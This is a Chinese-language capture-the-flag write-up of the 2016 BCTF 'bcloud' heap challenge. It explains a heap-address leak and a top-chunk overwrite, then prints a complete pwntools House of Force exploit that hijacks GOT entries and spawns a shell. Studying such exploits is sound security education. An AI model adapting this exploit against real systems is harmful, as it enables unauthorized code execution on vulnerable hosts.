
title: 2016 BCTF bcloud (House Of Force)

date: 2018-04-17 21:24:31

categories:
- CTF
- House Of Force


## 基本分析

题目下载链接

https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

程序大概是一个云笔记管理系统。

1. 新建note，根据用户的输入x申请x+4的空间作为note的大小。
2. 展示note，啥功能也没有。。
3. 编辑note，根据用户指定的 note 编辑对应的内容。
4. 删除note，删除对应note。
5. 同步note，标记所有的note已经被同步。

### 初始化名字

**在程序初始化的时候有两个漏洞。**

这里如果程序读入的名字为64个字符，那么当程序在使用info函数输出对应的字符串时，就会输出对应的tmp指针内容，也就是说**泄露了堆的地址**。

**输入的大小为0x40时最后的0x00 会溢出到*tmp，紧接着会malloc(0x40)覆盖掉输入的0x00截断。**

```c
unsigned int init_name(){
  char s; // [esp+1Ch] [ebp-5Ch]
  char *tmp; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(&s, 0, 0x50u);
  puts("Input your name:");
  read_str(&s, 0x40, '\n');
  tmp = (char *)malloc(0x40u);
  name = tmp;
  strcpy(tmp, &s);
  info(tmp);
  return __readgsdword(0x14u) ^ v3;
}
```

### 初始化组织和org的时候存在漏洞

```c
unsigned int init_org_host(){
  char s; // [esp+1Ch] [ebp-9Ch]
  char *v2; // [esp+5Ch] [ebp-5Ch]
  char v3; // [esp+60h] [ebp-58h]
  char *v4; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(&s, 0, 0x90u);
  puts("Org:");
  read_str(&s, 64, 10);
  puts("Host:");
  read_str(&v3, 64, 10);
  v4 = (char *)malloc(0x40u);
  v2 = (char *)malloc(0x40u);
  org = v2;
  host = v4;
  strcpy(v4, &v3);
  strcpy(v2, &s);
  puts("OKay! Enjoy:)");
  return __readgsdword(0x14u) ^ v5;
}
```

当读入组织时，给定 0x40 字节，会覆盖 v2 的低地址。与此同时，我们可以知道 v2 是与 top chunk 相邻的 chunk，而 v2 恰好与 org 相邻，那么由于在 32 位程序中，一般都是 32 位全部都使用，这里 v2 所存储的内容，几乎很大程度上都不是 `\x00` ，所以当执行 strcpy 函数向 v2 中拷贝内容时，很有可能会覆盖top chunk。这就是漏洞所在。

## 利用

1. `get_name` 处利用漏洞，拿到 `heap` 的地址，计算 `top chunk` 的地址
2. `house of force` 分配到 `note_ptr_table` 的地址
3. 利用 `edit` 功能实现任意地址写
4. 把`free@got` 改成 `puts@plt`，实现任意地址读
5. 读 `puts@got` 拿到 `libc` 的基地址
6. 修改 `aoti@got` 为 `system`
7. 发送 `sh` , 触发 `aoti("sh")`, 实际执行的是 `system("sh")`

### 完整利用

```python
#/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
# context.terminal = ['tmux', 'splitw', '-h']
# context(log_level='debug')

free_got = 0x0804B014
puts_plt = 0x08048520
puts_got = 0x0804B024

p = process("./bcloud")
pause()
p.recvuntil("Input your name:")
p.send("a" * 0x40)
p.recv(0x44)
p.recv(0x44)
heap = u32(p.recv(4)) - 0x8
top_chunk_addr = heap + 216
log.info("got heap: " + hex(heap))
log.info("got top_chunk_addr: " + hex(top_chunk_addr))
pause()
# p.recvuntil("Org:")
p.send("b" * 0x40)
payload = p32(0xffffffff)  #  top chunk 的 size 位
payload += "c" * (0x40 - len(payload))
p.recvuntil("Host:")
p.send(payload)
bss_addr = 0x0804B120   #  note_ptr_table 的地址
evil_size = bss_addr - 8 - top_chunk_addr  # 计算一个size , 用于在第二次 malloc 是返回 bss_addr
log.info("evil_size: " + hex(evil_size))
log.info("set top chunk size: 0xffffffff")
pause()



p.recvuntil("option--->>")
p.sendline("1")
p.recvuntil("note content:")
p.sendline(str(evil_size-8-4))   # malloc(len + 4), note0
p.recvuntil("Input the content:")
p.sendline("a" * 4)


## 
p.recvuntil("option--->>")
p.sendline("1")
p.recvuntil("note content:")
p.sendline(str(0x40))       #  此时分配到 note1,  note1 ---> bss_addr
p.recvuntil("Input the content:")
payload = p32(free_got)
payload += p32(bss_addr)  # 为了维持控制，使得 note_ptr_table[1] 的值始终为 note_ptr_table 的地址
p.sendline(payload)


## note 2
p.recvuntil("option--->>")
p.sendline("1")
p.recvuntil("note content:")
p.sendline(str(0x40))
p.recvuntil("Input the content:")
p.sendline("a" * 4)


log.info("note0--->free@got , note1--->ptr_table")


pause()
p.recvuntil("option--->>")
p.sendline("3")
p.recvuntil("Input the id:")
p.sendline(str(1))
p.recvuntil("Input the new content:")
payload = p32(free_got)
payload += p32(bss_addr)
payload += p32(free_got)   # target addr , 要写的地址
payload += p32(puts_got)
p.sendline(payload)


p.recvuntil("option--->>")
p.sendline("3")
p.recvuntil("Input the id:")
p.sendline(str(2))
p.recvuntil("Input the new content:")
p.sendline(p32(puts_plt))   # data to write，要写的数据
log.info("free@got ---> puts_plt")



pause()
p.recvuntil("option--->>")
p.sendline("4")
p.recvuntil("Input the id:")
p.sendline(str(3))   # free -> puts , get puts addr  
libc = u32(p.recvuntil("Delete success.")[1:5]) - 0x5fca0 # readelf -a libc.so.6| grep puts  
system = libc + 0x3ada0   # readelf -a libc.so.6| grep system  , get system offset
log.info("libc: " + hex(libc))
log.info("system: " + hex(system))


pause()
p.recvuntil("option--->>")
p.sendline("3")
p.recvuntil("Input the id:")
p.sendline(str(1))
p.recvuntil("Input the new content:")
aoti_got = 0x0804B03C   # IDA , 
payload = p32(free_got)
payload += p32(bss_addr)
payload += p32(aoti_got)
p.sendline(payload)


p.recvuntil("option--->>")
p.sendline("3")
p.recvuntil("Input the id:")
p.sendline(str(2))
p.recvuntil("Input the new content:")
p.sendline(p32(system))
log.info("aoti--->system")
pause()

p.sendline("/bin/sh")
p.interactive()
```



## 参考

[Attack Top Chunk之 bcloud](http://blog.hac425.top/2018/03/21/tack_top_chunk_bcloud.html)

[BCTF bcloud - Exploitation 150](http://uaf.io/exploitation/2016/03/20/BCTF-bcloud.html)

[House Of Force](https://ctf-wiki.github.io/ctf-wiki/pwn/heap/house_of_force/#2016-bctf-bcloud)

